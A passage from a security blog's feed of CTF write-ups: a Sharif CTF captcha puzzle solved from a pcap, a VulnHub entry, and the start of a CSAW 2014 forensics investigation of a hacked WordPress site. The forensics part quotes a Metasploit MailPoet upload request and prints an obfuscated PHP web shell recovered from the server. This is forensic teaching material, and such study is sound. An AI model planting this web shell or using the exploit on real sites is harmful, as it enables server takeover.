</span><span class="line">					<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.php.net/manual/en/security.database.sql-injection.php&quot;</span><span class="nt">&gt;</span>E<span class="nt">&lt;/a&gt;</span>
</span><span class="line">					<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.unixwiz.net/techtips/sql-injection.html&quot;</span><span class="nt">&gt;</span>T<span class="nt">&lt;/a&gt;</span>
</span><span class="line">
</span><span class="line">					<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.google.com/recaptcha/intro/index.html&quot;</span><span class="nt">&gt;</span>V<span class="nt">&lt;/a&gt;</span>
</span><span class="line">					<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://en.wikipedia.org/wiki/OWASP&quot;</span><span class="nt">&gt;</span>U<span class="nt">&lt;/a&gt;</span>
</span><span class="line">					<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.phpcaptcha.org/documentation/quickstart-guide/&quot;</span><span class="nt">&gt;</span>L<span class="nt">&lt;/a&gt;</span>
</span><span class="line">
</span><span class="line">					<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.merriam-webster.com/dictionary/hack&quot;</span><span class="nt">&gt;</span>A<span class="nt">&lt;/a&gt;</span>
</span><span class="line">					<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.urbandictionary.com/define.php?term=hack&quot;</span><span class="nt">&gt;</span>N<span class="nt">&lt;/a&gt;</span>
</span><span class="line">					<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.hackthissite.org/&quot;</span><span class="nt">&gt;</span>D<span class="nt">&lt;/a&gt;</span>
</span><span class="line">
</span><span class="line">					<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.phpcaptcha.org/posts/wordpress-plugin-released/&quot;</span><span class="nt">&gt;</span>A<span class="nt">&lt;/a&gt;</span>
</span><span class="line">
</span><span class="line">					<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://en.wiktionary.org/wiki/hack&quot;</span><span class="nt">&gt;</span>H<span class="nt">&lt;/a&gt;</span>
</span><span class="line">					<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.captcha.net/&quot;</span><span class="nt">&gt;</span>A<span class="nt">&lt;/a&gt;</span>
</span><span class="line">					<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://captchas.net/sample/php/&quot;</span><span class="nt">&gt;</span>C<span class="nt">&lt;/a&gt;</span>
</span><span class="line">					<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://www.phpcaptcha.org/download/wordpress-plugin/&quot;</span><span class="nt">&gt;</span>K<span class="nt">&lt;/a&gt;</span>
</span><span class="line">				<span class="nt">&lt;/div&gt;</span>
</span><span class="line">				<span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">class=</span><span class="s">&quot;btn btn-primary btn-block&quot;</span><span class="nt">&gt;</span>send<span class="nt">&lt;/button&gt;</span>
</span><span class="line">			<span class="nt">&lt;/form&gt;</span>
</span><span class="line">		<span class="nt">&lt;/div&gt;</span>
</span><span class="line">	<span class="nt">&lt;/div&gt;</span>
</span><span class="line"><span class="nt">&lt;/div&gt;</span>
</span><span class="line"><span class="nt">&lt;/body&gt;</span>
</span><span class="line"><span class="nt">&lt;/html&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
<p>and at the <em>style.css</em></p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
<span class="line-number">42</span>
<span class="line-number">43</span>
<span class="line-number">44</span>
</pre></td><td class="code"><pre><code class="css"><span class="line"><span class="nf">#captcha</span> <span class="p">{</span>
</span><span class="line">  <span class="k">width</span><span class="o">:</span> <span class="m">300px</span><span class="p">;</span>
</span><span class="line">  <span class="k">height</span><span class="o">:</span> <span class="m">100px</span><span class="p">;</span>
</span><span class="line">  <span class="k">margin-right</span><span class="o">:</span> <span class="k">auto</span><span class="p">;</span>
</span><span class="line">  <span class="k">margin-left</span><span class="o">:</span> <span class="k">auto</span><span class="p">;</span>
</span><span class="line">  <span class="k">position</span><span class="o">:</span> <span class="k">relative</span><span class="p">;</span>
</span><span class="line">  <span class="k">background-color</span><span class="o">:</span> <span class="m">#000000</span><span class="p">;</span>
</span><span class="line">  <span class="k">white-space</span><span class="o">-</span><span class="k">collapse</span><span class="o">:</span> <span class="n">discard</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="nf">#captcha</span> <span class="nt">a</span> <span class="p">{</span>
</span><span class="line">  <span class="k">font-size</span><span class="o">:</span> <span class="m">15px</span><span class="p">;</span>
</span><span class="line">  <span class="k">pointer</span><span class="o">-</span><span class="n">events</span><span class="o">:</span> <span class="k">none</span><span class="p">;</span>
</span><span class="line">  <span class="k">cursor</span><span class="o">:</span> <span class="k">default</span><span class="p">;</span>
</span><span class="line">  <span class="o">-</span><span class="n">webkit</span><span class="o">-</span><span class="n">touch</span><span class="o">-</span><span class="n">callout</span><span class="o">:</span> <span class="k">none</span><span class="p">;</span>
</span><span class="line">  <span class="o">-</span><span class="n">webkit</span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="n">select</span><span class="o">:</span> <span class="k">none</span><span class="p">;</span>
</span><span class="line">  <span class="o">-</span><span class="n">khtml</span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="n">select</span><span class="o">:</span> <span class="k">none</span><span class="p">;</span>
</span><span class="line">  <span class="o">-</span><span class="n">moz</span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="n">select</span><span class="o">:</span> <span class="k">none</span><span class="p">;</span>
</span><span class="line">  <span class="o">-</span><span class="n">ms</span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="n">select</span><span class="o">:</span> <span class="k">none</span><span class="p">;</span>
</span><span class="line">  <span class="n">user</span><span class="o">-</span><span class="n">select</span><span class="o">:</span> <span class="k">none</span><span class="p">;</span>
</span><span class="line">  <span class="k">position</span><span class="o">:</span> <span class="k">absolute</span><span class="p">;</span>
</span><span class="line">  <span class="k">display</span><span class="o">:</span> <span class="k">inline</span><span class="o">-</span><span class="k">block</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="nf">#captcha</span> <span class="nt">a</span><span class="o">,</span>
</span><span class="line"><span class="nf">#captcha</span> <span class="nt">a</span><span class="nd">:hover</span><span class="o">,</span>
</span><span class="line"><span class="nf">#captcha</span> <span class="nt">a</span><span class="nd">:focus</span> <span class="p">{</span>
</span><span class="line">  <span class="k">color</span><span class="o">:</span> <span class="m">#000000</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="nf">#captcha</span> <span class="nt">a</span><span class="nd">:visited</span> <span class="p">{</span>
</span><span class="line">  <span class="k">color</span><span class="o">:</span> <span class="m">#ff0000</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="nf">#captcha</span> <span class="nt">a</span><span class="nd">:nth-child</span><span class="o">(</span><span class="nt">1</span><span class="o">)</span> <span class="p">{</span>
</span><span class="line">  <span class="k">left</span><span class="o">:</span> <span class="m">3.45699886px</span><span class="p">;</span>
</span><span class="line">  <span class="k">top</span><span class="o">:</span> <span class="m">26.46903004px</span><span class="p">;</span>
</span><span class="line">  <span class="o">-</span><span class="n">webkit</span><span class="o">-</span><span class="n">transform</span><span class="o">:</span> <span class="n">rotate</span><span class="p">(</span><span class="m">-3</span><span class="o">.</span><span class="m">45879735</span><span class="n">deg</span><span class="p">);</span>
</span><span class="line">  <span class="o">-</span><span class="n">ms</span><span class="o">-</span><span class="n">transform</span><span class="o">:</span> <span class="n">rotate</span><span class="p">(</span><span class="m">-3</span><span class="o">.</span><span class="m">45879735</span><span class="n">deg</span><span class="p">);</span>
</span><span class="line">  <span class="n">transform</span><span class="o">:</span> <span class="n">rotate</span><span class="p">(</span><span class="m">-3</span><span class="o">.</span><span class="m">45879735</span><span class="n">deg</span><span class="p">);</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="nf">#captcha</span> <span class="nt">a</span><span class="nd">:nth-child</span><span class="o">(</span><span class="nt">2</span><span class="o">)</span> <span class="p">{</span>
</span><span class="line">  <span class="k">left</span><span class="o">:</span> <span class="m">19.42964103px</span><span class="p">;</span>
</span><span class="line">  <span class="k">top</span><span class="o">:</span> <span class="m">28.76705699px</span><span class="p">;</span>
</span><span class="line">  <span class="o">-</span><span class="n">webkit</span><span class="o">-</span><span class="n">transform</span><span class="o">:</span> <span class="n">rotate</span><span class="p">(</span><span class="m">-9</span><span class="o">.</span><span class="m">34001927</span><span class="n">deg</span><span class="p">);</span>
</span><span class="line">  <span class="o">-</span><span class="n">ms</span><span class="o">-</span><span class="n">transform</span><span class="o">:</span> <span class="n">rotate</span><span class="p">(</span><span class="m">-9</span><span class="o">.</span><span class="m">34001927</span><span class="n">deg</span><span class="p">);</span>
</span><span class="line">  <span class="n">transform</span><span class="o">:</span> <span class="n">rotate</span><span class="p">(</span><span class="m">-9</span><span class="o">.</span><span class="m">34001927</span><span class="n">deg</span><span class="p">);</span>
</span><span class="line"><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Oh… Ok, now i get it, the links are building the captcha!</p>

<p>Let’s try this out: i tried to visit one of the links from the page source, so that they would appear as visited to the browser, and by refreshing the captcha page i was presented with a pleasant surprise.</p>

<p><img class="center" src="http://swappage.github.io/images/2014-10-09/partial_captcha.png" /></p>

<p>So now i had the point of the challenge! Basically the captcha string depended on the sites visited by the user, what i needed to do, to obtain the captcha string was to verify which sites among the ones in the captcha page were present in the pcap, respecting the following criteria:</p>

<ul>
  <li>the site should have been visited before http://captcha.ctf.sharif.edu/captcha/ was visited (there were a couple of browsing sessions after that)</li>
  <li>the source ip address should have been the same (better making sure not to include other potential users)</li>
  <li>the browser used should have been always the same as the one used for visiting the captcha page (in the pcap multiple user agents were present)</li>
</ul>

<p>doing the search by end in wireshark would have been frustrating, even by using filters, so i created a filter like the following</p>

<pre><code>frame.number &lt; 14127 &amp;&amp; ip.src == 10.10.12.30 &amp;&amp; http.user_agent == "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.11 (KHTML, like Gecko) Ubuntu/12.04 Chromium/20.0.1132.47 Chrome/20.0.1132.47 Safari/536.11" &amp;&amp; http.request.full_uri == ""
</code></pre>

<p>And with the help of some basic bash scripting i cycled through the links in the captcha page to see if they were visited or not.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="c">#!/bin/bash</span>
</span><span class="line">
</span><span class="line"><span class="nv">URLS</span><span class="o">=</span><span class="k">$(</span>grep <span class="s2">&quot;a href&quot;</span> captcha.htm <span class="p">|</span> awk -F <span class="s1">&#39;\&quot;&#39;</span> <span class="s1">&#39;{print $2}&#39;</span><span class="k">)</span>
</span><span class="line">
</span><span class="line"><span class="k">for</span> url in <span class="nv">$URLS</span><span class="p">;</span> <span class="k">do</span>
</span><span class="line">		<span class="nv">FILTER</span><span class="o">=</span><span class="s2">&quot;frame.number &lt; 14127 &amp;&amp; ip.src == 10.10.12.30 &amp;&amp; http.user_agent == \&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.11 (KHTML, like Gecko) Ubuntu/12.04 Chromium/20.0.1132.47 Chrome/20.0.1132.47 Safari/536.11\&quot; &amp;&amp; http.request.full_uri == \&quot;$url\&quot;&quot;</span>
</span><span class="line">		<span class="nv">VISITED</span><span class="o">=</span><span class="k">$(</span>tshark -R <span class="s2">&quot;$FILTER&quot;</span> -r captcha.pcap 2&gt; /dev/null <span class="p">|</span> wc -l<span class="k">)</span>
</span><span class="line">		<span class="k">if</span> <span class="o">[</span> <span class="nv">$VISITED</span> -ne <span class="m">0</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span><span class="line">				<span class="nb">echo</span> <span class="nv">$url</span>
</span><span class="line">		<span class="k">fi</span>
</span><span class="line"><span class="k">done</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>All was left to do was to take the returned URLs, open them in the browser and see the resulting captcha</p>

<p><img class="center" src="http://swappage.github.io/images/2014-10-09/solvedcaptcha.png" /></p>

<p>What else can i say? well, i think i’ll probably submit this pcap file to the Xplico dev team so that they can check why <em>style.css</em> wasn’t decoded properly.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Vulnhub Competition: Persistence]]></title>
    <link href="http://swappage.github.io/blog/2014/10/06/vulnhub-competition-persistence/"/>
    <updated>2014-10-06T23:35:09+02:00</updated>
    <id>http://swappage.github.io/blog/2014/10/06/vulnhub-competition-persistence</id>
    <content type="html"><![CDATA[<p>Only a couple of hours have past since Persistence <a href="http://www.vulnhub.com/">VulnHub</a> competition ended.</p>

<p>Of course, again, as a VulnHub addict as i am, i couldn’t refrain my urge to partecipate and feel the pain :)</p>

<p>I really enjoyed playing this vulnerable VM, and the reward for such an high amount of frustration was a lot and lot of fun.</p>

<p>Many people partecipated this time, way more then the ones who took part in the Hades challenge, and this is a demonstration that VulnHub is getting more and more popular every day.</p>

<!-- more -->

<p>Now that the competition is over, i feel like i want to share my submission with everyone, by linking the PDF directly here… yes, i know, i’m lazy, but i don’t feel like copying and pasting it into a blog post, considering the result would be pretty much the same :).</p>

<p>And yes yes, i also know that my english is terrible, but i think that it is, at a bare minimum, at least understandable.</p>

<p>I intend to use this post also to thank <a href="http://blog.techorganic.com/">Superkojiman</a>, sagi- for the effort and time spent in putting togeder this funny VM, and of course <a href="http://www.vulnhub.com/">VulnHub</a> staff that every day put a lot of energy in keeping the great project going for the good of the community, by providing an awesome playground for having fun and learning stuff free of charge :)</p>

<p>For those who are still interested in reading it, here is my writeup (in PDF format): <a href="http://swappage.github.io/images/2014-10-06/persistence.pdf">Persistence</a></p>

<p>Oh, and i almost forgot, <a href="http://download.vulnhub.com/media/persistence/">here</a> you can find other writeups from other people who made a submissions, for your reading pleasure.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSAW 2014: Fluffy No More]]></title>
    <link href="http://swappage.github.io/blog/2014/09/28/csaw-2014-fluffy-no-more/"/>
    <updated>2014-09-28T16:44:18+02:00</updated>
    <id>http://swappage.github.io/blog/2014/09/28/csaw-2014-fluffy-no-more</id>
    <content type="html"><![CDATA[<p>The CSAW CTF 2014 wasn’t only exploitation and reverse engineering, within the challenges a whole category was focused on forensics puzzles.</p>

<p>Fluffy No More was a 300 points worth challenge for which the solution could have been achieved by conducting a full scope forensics analysis of a compromised system.</p>

<p>The players were provided with an archive containing</p>

<ul>
  <li>a database dump</li>
  <li>the content of /var/log</li>
  <li>the content of /var/www/html</li>
  <li>the content of /etc</li>
</ul>

<p>All the informations were (badly imho) logically acquired from the compromised system, and the challenge was focused mostly on forensics methodology: if the player was good enaugh to understand what happened on the system, he’d find the hidden flag.</p>

<!-- more -->

<p>First thing first, let’s say that this is how I solved the puzzle, probably there were other easier paths, but I still decided to approach this game like it was a real case, thinking that it was the best way to not leave anything behind.</p>

<p>The fictional scenario involved a compromised wordpress blog, so as a first step, i decided that it was worth to find a clue about how the attacker compromised it.</p>

<p>I had the logs from the web server, but like in any webserver logs, when analyzing them you run through lots of false positives, and this was also the case; reason why I decided to start by looking at the database dump.</p>

<p>To make my life easier, i quickly imported the database and the blog site on a lab machine, and started looking into it:
It was a matter of no time that I could spot a comment to a blog post boasting about the will of compromising the site.</p>

<p><img class="center" src="http://swappage.github.io/images/2014-09-28/comment.png" /></p>

<p>I remembered that wordpress, in the comments table, has a field where the IP address of the posting user is saved, I decided to take a look at it, because i thought that it could have been useful in terms of correlations with the apache webserver logs. In most cases this is not gonna happen, you’ll unlikely be so lucky, but I was approaching to a CTF problem, not a real world scenario, and so I decided to bet on this.</p>

<pre><code>+------------+----------------+-------------------+
| comment_ID | comment_author | comment_author_IP |
+------------+----------------+-------------------+
|          4 | Hacker         | 192.168.127.130   |
+------------+----------------+-------------------+
</code></pre>

<p>Messing with the logs at this poit was a possibility, but i decided that probably if I had more details on the wordpress installation itself, this would have helped me out more in filtering the log results.</p>

<p>I reset my instance of the blog and logged in as admin to check for the list of installed plugins, and verify if at least one of them was vulnerable.</p>

<p><img class="center" src="http://swappage.github.io/images/2014-09-28/mailpoet.png" /></p>

<p>Mail Poet newsletter pulled my attention as it was the only plugin that was alerting that a new version was available, so why not look in public repositories if an exploit for the installed version is available?</p>

<p>I browsed exploit-db and it resulted that a metasploit module to gain remote code execution on this specific wordpress plugin is available.</p>

<p><img class="center" src="http://swappage.github.io/images/2014-09-28/edb.png" /></p>

<p>By a quick look at the exploit code, it’s possible to figure out that an attacker can upload an arbitrary payload by sending the following POST request</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
</pre></td><td class="code"><pre><code class="ruby"><span class="line"><span class="n">res</span> <span class="o">=</span> <span class="n">send_request_cgi</span><span class="p">({</span>
</span><span class="line">  <span class="s1">&#39;method&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
</span><span class="line">  <span class="s1">&#39;uri&#39;</span>      <span class="o">=&gt;</span> <span class="n">uri</span><span class="p">,</span>
</span><span class="line">  <span class="s1">&#39;ctype&#39;</span>    <span class="o">=&gt;</span> <span class="s2">&quot;multipart/form-data; boundary=</span><span class="si">#{</span><span class="n">data</span><span class="o">.</span><span class="n">bound</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class="line">  <span class="s1">&#39;vars_get&#39;</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="s1">&#39;page&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;wysija_campaigns&#39;</span><span class="p">,</span> <span class="s1">&#39;action&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;themes&#39;</span> <span class="p">},</span>
</span><span class="line">  <span class="s1">&#39;data&#39;</span>     <span class="o">=&gt;</span> <span class="n">post_data</span>
</span><span class="line"><span class="p">})</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>and if we look at the apache access log, we could find:</p>

<pre><code>192.168.127.140 - - [16/Sep/2014:20:42:54 +0000] "POST /wp-admin/admin-post.php?page=wysija_campaigns&amp;action=themes HTTP/1.1" 302 385 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
</code></pre>

<p>Ok, now let’s see if we can find the uploaded malicious file, according to the exploit code, the call for the payload is done as follows:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class="ruby"><span class="line"><span class="n">payload_uri</span> <span class="o">=</span> <span class="n">normalize_uri</span><span class="p">(</span><span class="n">target_uri</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="s1">&#39;wp-content&#39;</span><span class="p">,</span> <span class="s1">&#39;uploads&#39;</span><span class="p">,</span> <span class="s1">&#39;wysija&#39;</span><span class="p">,</span> <span class="s1">&#39;themes&#39;</span><span class="p">,</span> <span class="n">theme_name</span><span class="p">,</span> <span class="n">payload_name</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>so by grepping the logs again we could find</p>

<pre><code>192.168.127.140 - - [16/Sep/2014:20:42:54 +0000] "GET /wp-content/uploads/wysija/themes/weblizer/template.php HTTP/1.1" 200 165 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
</code></pre>

<p>Let’s give a look at this file, it’s most likely gonna be malicious, and in fact</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
</pre></td><td class="code"><pre><code class="php"><span class="line"><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class="line"><span class="nv">$hije</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;ey&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;seyteyrey_reyeeypleyaeyceye&quot;</span><span class="p">);</span>
</span><span class="line"><span class="nv">$andp</span><span class="o">=</span><span class="s2">&quot;JsqGMsq9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYSsqk9PSdoYScgJisqYgsqJsqGMoJ&quot;</span><span class="p">;</span>
</span><span class="line"><span class="nv">$rhhm</span><span class="o">=</span><span class="s2">&quot;nsqKSwgam9pbihhcnJheV9zbGljZSgkYSwksqYygkYSksqtMykpKSksqpO2VjaG8sqgJsqzwvJy4kay4nPic7fQ==&quot;</span><span class="p">;</span>
</span><span class="line"><span class="nv">$pvqw</span><span class="o">=</span><span class="s2">&quot;GEpPjMpeyRrPSdja2l0JztlY2hvICc8Jy4kaysq4nPicsq7ZXZhbChsqiYXNlNjRfZGVjb2RlKHByZsqWdfcmVw&quot;</span><span class="p">;</span>
</span><span class="line"><span class="nv">$wfrm</span><span class="o">=</span><span class="s2">&quot;bGFjZShhcnsqJheSsqgsqnsqL1teXHcsq9XHNdLycsJy9ccy8nKSwgYsqXJyYXksqoJycsJyssq&quot;</span><span class="p">;</span>
</span><span class="line"><span class="nv">$vyoh</span> <span class="o">=</span> <span class="nv">$hije</span><span class="p">(</span><span class="s2">&quot;n&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;nbnansne64n_ndnecode&quot;</span><span class="p">);</span>
</span><span class="line"><span class="nv">$bpzy</span> <span class="o">=</span> <span class="nv">$hije</span><span class="p">(</span><span class="s2">&quot;z&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;zczreaztzez_zfzuznzcztzizon&quot;</span><span class="p">);</span>
</span><span class="line"><span class="nv">$xhju</span> <span class="o">=</span> <span class="nv">$bpzy</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$vyoh</span><span class="p">(</span><span class="nv">$hije</span><span class="p">(</span><span class="s2">&quot;sq&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$andp</span><span class="o">.</span><span class="nv">$pvqw</span><span class="o">.</span><span class="nv">$wfrm</span><span class="o">.</span><span class="nv">$rhhm</span><span class="p">)));</span> <span class="nv">$xhju</span><span class="p">();</span>
</span><span class="line"><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>This is definitely a web shell, and by looking at it, it’s most likely a weevely web shell: weevely web shell is evil to investigate, because it doesn’t use get or post parameters to send commands, but as opposite it uses cookies, which are not logged in the webserver logs.</p>

<p>So from now on, understanding what happened was a real deal.</p>

<p>The attacker managed to obtain remote code execution on the server, but what would an attacker do from there on?</p>

<p>It’s fair to assume that he might have tried to maintain access on the server, and potentially to install backdoors or spread malwares using the site; I was at a dead end tho, I couldn’t follow a logical step forward anymore, so what i was left to do was to look at the logs with a greedy approach to see if i could find something interesting.</p>

<p>And it was while i was looking at /var/log/auth.log that I noticed a bunch of weird sudo activities by the ubuntu user using sudo.</p>

<pre><code>Sep 17 19:18:45 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/bin/chgrp -R www-data /var/www/
Sep 17 19:18:45 ubuntu sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)
Sep 17 19:18:45 ubuntu sudo: pam_unix(sudo:session): session closed for user root
Sep 17 19:18:53 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/bin/chmod -R 775 /var/www/
Sep 17 19:18:53 ubuntu sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)
Sep 17 19:18:53 ubuntu sudo: pam_unix(sudo:session): session closed for user root
Sep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
Sep 17 19:20:09 ubuntu sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)
Sep 17 19:20:22 ubuntu sudo: pam_unix(sudo:session): session closed for user root
Sep 17 19:20:55 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/find /var/www/html/ * touch {}
</code></pre>

<p>what was going on here? why would the administrator tamper timestamps that badly? and most importantly, what was that vi on /var/www/html/wp-content/themes/twentythirteen/js/html5.js ?</p>

<p>Giving a quick look at that file revealed something extremely suspicious: the file looked like an obfuscated javascript:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
<span class="line-number">42</span>
<span class="line-number">43</span>
<span class="line-number">44</span>
<span class="line-number">45</span>
<span class="line-number">46</span>
<span class="line-number">47</span>
<span class="line-number">48</span>
<span class="line-number">49</span>
<span class="line-number">50</span>
<span class="line-number">51</span>
<span class="line-number">52</span>
<span class="line-number">53</span>
<span class="line-number">54</span>
<span class="line-number">55</span>
<span class="line-number">56</span>
<span class="line-number">57</span>
<span class="line-number">58</span>
<span class="line-number">59</span>
<span class="line-number">60</span>
<span class="line-number">61</span>
<span class="line-number">62</span>
<span class="line-number">63</span>
<span class="line-number">64</span>
<span class="line-number">65</span>
<span class="line-number">66</span>
<span class="line-number">67</span>
<span class="line-number">68</span>
<span class="line-number">69</span>
<span class="line-number">70</span>
<span class="line-number">71</span>
<span class="line-number">72</span>
<span class="line-number">73</span>
<span class="line-number">74</span>
<span class="line-number">75</span>
<span class="line-number">76</span>
<span class="line-number">77</span>
<span class="line-number">78</span>
<span class="line-number">79</span>
<span class="line-number">80</span>
<span class="line-number">81</span>
<span class="line-number">82</span>
<span class="line-number">83</span>
<span class="line-number">84</span>
<span class="line-number">85</span>
<span class="line-number">86</span>
<span class="line-number">87</span>
<span class="line-number">88</span>
<span class="line-number">89</span>
<span class="line-number">90</span>
<span class="line-number">91</span>
<span class="line-number">92</span>
<span class="line-number">93</span>
<span class="line-number">94</span>
<span class="line-number">95</span>
<span class="line-number">96</span>
<span class="line-number">97</span>
<span class="line-number">98</span>
<span class="line-number">99</span>
<span class="line-number">100</span>
<span class="line-number">101</span>
<span class="line-number">102</span>
